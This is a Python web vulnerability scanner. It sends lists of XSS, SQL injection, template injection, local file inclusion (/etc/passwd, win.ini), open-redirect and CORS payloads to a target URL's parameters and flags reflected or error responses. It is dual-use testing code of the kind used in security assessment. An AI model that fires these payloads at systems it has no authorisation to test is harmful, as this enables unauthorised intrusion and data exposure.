import httpx
import re
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse


XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "1' AND SLEEP(3)--",
    "1 UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:3'--",
]

SQLI_ERRORS = [
    r"sql syntax",
    r"mysql_fetch",
    r"sqlite3?\.OperationalError",
    r"pg_query",
    r"ORA-\d{5}",
    r"Microsoft SQL Native Client",
    r"ODBC SQL Server Driver",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"syntax error at or near",
    r"PostgreSQL.*ERROR",
    r"Warning.*mysql_",
    r"MySqlException",
    r"valid MySQL result",
    r"mysqli_",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{config}}", "SECRET_KEY"),
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
]

LFI_INDICATORS = [
    r"root:x:0:0",
    r"\[extensions\]",
    r"daemon:",
    r"bin/bash",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
]


def test_xss(url: str, params: dict) -> list:
    findings = []
    for param_name in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            try:
                r = httpx.get(url, params=test_params, follow_redirects=True, timeout=10, verify=False)
                if payload in r.text:
                    findings.append({
                        "type": "XSS (Reflected)",
                        "severity": "HIGH",
                        "url": url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Payload reflected in response body",
                    })
                    break
            except Exception:
                continue

            try:
                r = httpx.post(url, data=test_params, follow_redirects=True, timeout=10, verify=False)
                if payload in r.text:
                    findings.append({
                        "type": "XSS (Reflected via POST)",
                        "severity": "HIGH",
                        "url": url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": "Payload reflected in POST response body",
                    })
                    break
            except Exception:
                continue
    return findings


def test_sqli(url: str, params: dict) -> list:
    findings = []
    for param_name in params:
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            try:
                r = httpx.get(url, params=test_params, follow_redirects=True, timeout=15, verify=False)
                for pattern in SQLI_ERRORS:
                    if re.search(pattern, r.text, re.I):
                        findings.append({
                            "type": "SQL Injection",
                            "severity": "CRITICAL",
                            "url": url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": f"SQL error pattern matched: {pattern}",
                        })
                        break
            except Exception:
                continue

        try:
            true_params = params.copy()
            true_params[param_name] = "1 AND 1=1"
            false_params = params.copy()
            false_params[param_name] = "1 AND 1=2"
            r_true = httpx.get(url, params=true_params, timeout=10, verify=False)
            r_false = httpx.get(url, params=false_params, timeout=10, verify=False)
            if len(r_true.text) != len(r_false.text) and abs(len(r_true.text) - len(r_false.text)) > 50:
                findings.append({
                    "type": "SQL Injection (Boolean-based blind)",
                    "severity": "CRITICAL",
                    "url": url,
                    "param": param_name,
                    "payload": "1 AND 1=1 vs 1 AND 1=2",
                    "evidence": f"Response size diff: {len(r_true.text)} vs {len(r_false.text)}",
                })
        except Exception:
            pass
    return findings


def test_ssti(url: str, params: dict) -> list:
    findings = []
    for param_name in params:
        for payload, expected in SSTI_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            try:
                r = httpx.get(url, params=test_params, follow_redirects=True, timeout=10, verify=False)
                if expected in r.text and payload not in r.text:
                    findings.append({
                        "type": "SSTI (Server-Side Template Injection)",
                        "severity": "CRITICAL",
                        "url": url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Template expression evaluated: found '{expected}' in response",
                    })
                    break
            except Exception:
                continue
    return findings


def test_lfi(url: str, params: dict) -> list:
    findings = []
    for param_name in params:
        for payload in LFI_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            try:
                r = httpx.get(url, params=test_params, follow_redirects=True, timeout=10, verify=False)
                for indicator in LFI_INDICATORS:
                    if re.search(indicator, r.text):
                        findings.append({
                            "type": "LFI (Local File Inclusion)",
                            "severity": "CRITICAL",
                            "url": url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": f"File content indicator found: {indicator}",
                        })
                        break
            except Exception:
                continue
    return findings


def test_open_redirect(url: str, params: dict) -> list:
    findings = []
    redirect_params = [p for p in params if any(k in p.lower() for k in ["url", "redirect", "next", "return", "goto", "dest", "target", "rurl", "link"])]
    for param_name in redirect_params:
        for payload in OPEN_REDIRECT_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            try:
                r = httpx.get(url, params=test_params, follow_redirects=False, timeout=10, verify=False)
                location = r.headers.get("location", "")
                if "evil.com" in location:
                    findings.append({
                        "type": "Open Redirect",
                        "severity": "MEDIUM",
                        "url": url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Redirects to: {location}",
                    })
                    break
            except Exception:
                continue
    return findings


def test_cors(url: str) -> list:
    findings = []
    try:
        r = httpx.get(url, headers={"Origin": "https://evil.com"}, timeout=10, verify=False)
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        if acao == "https://evil.com":
            sev = "HIGH" if acac.lower() == "true" else "MEDIUM"
            findings.append({
                "type": "CORS Misconfiguration",
                "severity": sev,
                "url": url,
                "evidence": f"Origin reflected: {acao}, Credentials: {acac}",
            })
        elif acao == "*":
            findings.append({
                "type": "CORS Wildcard",
                "severity": "LOW",
                "url": url,
                "evidence": "Access-Control-Allow-Origin: *",
            })
    except Exception:
        pass
    return findings


def scan_url(url: str, params: dict) -> list:
    all_findings = []
    all_findings.extend(test_xss(url, params))
    all_findings.extend(test_sqli(url, params))
    all_findings.extend(test_ssti(url, params))
    all_findings.extend(test_lfi(url, params))
    all_findings.extend(test_open_redirect(url, params))
    all_findings.extend(test_cors(url))
    return all_findings
